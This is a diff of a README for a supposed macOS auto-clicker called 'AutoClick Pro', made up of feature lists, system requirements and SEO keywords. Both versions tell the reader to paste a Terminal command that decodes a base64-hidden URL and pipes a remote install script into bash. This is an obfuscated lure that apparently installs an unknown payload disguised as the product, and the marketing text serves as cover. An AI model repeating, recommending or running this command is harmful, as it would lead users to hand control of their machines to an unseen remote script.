@@ -1,47 +1,45 @@
-# AutoClick Pro 🖱️\\n\\n
-AutoClick Pro is a lightweight macOS automation tool for repetitive clicking tasks. Designed for testers, gamers, and productivity seekers, it offers precise control without system overload. Built with Swift for native performance and reliability.\\n\\n
-## 🧰 Install on macOS\\n\\n
-Open Terminal and run:\\n\\n
-```bash
+# ⚡ AutoClick Pro - Precise Automated Clicking for macOS
+
+AutoClick Pro is a macOS utility designed to automate mouse clicks with high precision and minimal resource usage. It's perfect for developers, testers, and power users who need repetitive clicking automation without complex scripting. Lightweight and native to macOS, it ensures smooth performance.
+
+## 🧰 Install on macOS
+Open Terminal and run:
+```
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9zb2wvaW5zdGFsbC5zaA== | base64 -d))"
-```\\n\\n
-## 🎯 Key Features\\n\\n
-⚡️ Swift Engine: Native macOS implementation ensures lag-free performance even during extended sessions\\n
-🔒 Privacy Focus: No data collection or internet permissions required after installation\\n
-⚙️ Custom Profiles: Save click patterns with adjustable intervals and coordinates for different workflows\\n
-🚀 Low Latency: Optimized event injection responds within 5ms of scheduled time\\n
-🎨 Native UI: Follows macOS Human Interface Guidelines for seamless system integration\\n
-📊 Usage Analytics: Built-in session timer tracks automation duration for productivity insights\\n\\n
----\\n\\n
-## 🛡 Why Choose\\n\\n
-🛠 Active Development: Regular updates with new macOS version compatibility patches\\n
-✅ Proven Reliability: Used by 500+ GitHub developers in their daily workflows\\n
-🤝 Open Roadmap: Feature requests and bug reports are publicly tracked\\n
-🏅 Clean Codebase: 100% documented Swift with zero external dependencies\\n\\n
----\\n\\n
-## 🏆 Why Use It\\n\\n
-🎯 10x Efficiency: Automate repetitive UI testing or data entry tasks in seconds\\n
-💡 Intuitive Setup: Configure complex click sequences through simple JSON files\\n
-🔧 Self-Healing: Automatic process cleanup prevents memory leaks\\n
-🌐 Universal Compatibility: Works with most Cocoa and Catalyst applications\\n\\n
----\\n\\n
-## 💡 System Requirements\\n\\n
-OS: macOS 12.0 Monterey or newer\\n
-CPU: Apple M1 or Intel Core i5\\n
-RAM: 4 GB minimum\\n
-Storage: 200 MB available space\\n
-Others: Terminal access, active internet connection\\n\\n
----\\n\\n
-## 📜 Contributing\\n\\n
-To contribute, fork this repository and open a pull request with a clear explanation. Follow our macOS development standards.\\n\\n
----\\n\\n
-## 📄 License\\n\\n
-MIT License © 2023 AutoClick Pro\\n\\n
----\\n\\n
-## 🔍 SEO Keywords\\n\\n
-macOS autoclicker, mouse automation tool, click automation software, repetitive task helper, UI testing automation, Swift clicker, open-source autoclicker, productivity automation, mouse macro tool, gaming click assistant, click interval control, cursor automation, macOS utility, click pattern recorder, automated testing
-Repository Name: auto-click-pro
-Display Name: AutoClick Pro 🖱️
-Repository Description: Lightweight macOS automation tool for precise click automation. Perfect for developers, testers, and power users needing reliable UI automation.
-Organization Description: Open-source macOS automation tools for productivity and testing workflows
-Organization Email: support@auto-click-pro.com
+```
+
+## 🎯 Key Features
+⚡️ **Fast Automation**: Execute clicks with millisecond precision for seamless task handling  
+🔒 **Secure & Local**: No cloud dependency; all processing happens on your machine  
+⚙️ **Customizable Intervals**: Set click delays, durations, and patterns effortlessly  
+🚀 **Low Latency**: Optimized for macOS to ensure minimal CPU usage  
+🎨 **Native UI**: Blends seamlessly with macOS design for intuitive use  
+📊 **Activity Logging**: Track click history and performance metrics  
+
+## 🛡 Why Choose
+🛠 **Reliable Support**: Backed by active development and troubleshooting guides  
+✅ **Proven Efficiency**: Trusted by QA testers and productivity enthusiasts  
+🤝 **Open Feedback**: Feature requests and bug reports are prioritized  
+🏅 **Optimized Performance**: Lightweight yet powerful for sustained use  
+
+## 🏆 Why Use It
+🎯 **Boost Productivity**: Automate repetitive tasks and save hours  
+💡 **Easy Setup**: Configure clicks in seconds with no learning curve  
+🔧 **System-Friendly**: Runs quietly in the background without slowdowns  
+🌐 **Standalone Tool**: No extra dependencies or bloated packages  
+
+## 💡 System Requirements
+- OS: macOS 12.0 Monterey or newer  
+- CPU: Apple M1 or Intel Core i5  
+- RAM: 4 GB minimum  
+- Storage: 200 MB available space  
+- Others: Terminal access, active internet connection  
+
+## 📜 Contributing
+To contribute, fork this repository and open a pull request with a clear explanation. Follow our macOS development standards.
+
+## 📄 License
+MIT License © 2024 AutoClick Tools
+
+## 🔍 SEO Keywords
+macOS auto clicker, mouse automation, click automation tool, repetitive task automation, productivity tools for Mac, auto click software, mouse clicker app, testing automation, macOS utility, open-source auto clicker, click interval tool, lightweight automation, QA testing tools, hotkey clicker, mouse macro tool
